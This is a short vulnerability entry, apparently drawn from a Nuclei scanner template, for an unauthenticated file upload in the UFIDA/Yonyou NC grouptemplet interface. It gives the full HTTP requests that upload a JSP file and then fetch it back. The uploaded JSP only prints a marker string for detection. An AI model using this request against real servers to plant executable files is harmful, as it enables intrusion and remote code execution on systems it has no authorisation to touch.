# Vulnerability: UFIDA NC Grouptemplet Interface - Unauthenticated File Upload
**Classification:** YONYOU
**Source:** Nuclei Template (`yonyou-nc-grouptemplet-fileupload.yaml`)

## Description
The UFIDA NC Grouptemplet Interface permits unauthenticated users to upload potentially malicious files.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /uapim/upload/grouptemplet?groupid={{v1}}&fileType=jsp HTTP/1.1
Host: {{Hostname}}
Content-type: multipart/form-data; boundary=----------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7

------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7
Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.jsp"
Content-Type: application/octet-stream

<%out.println("{{randstr_2}}");%>
------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7--

GET /uapim/static/pages/{{v1}}/head.jsp HTTP/1.1
Host: {{Hostname}}
```

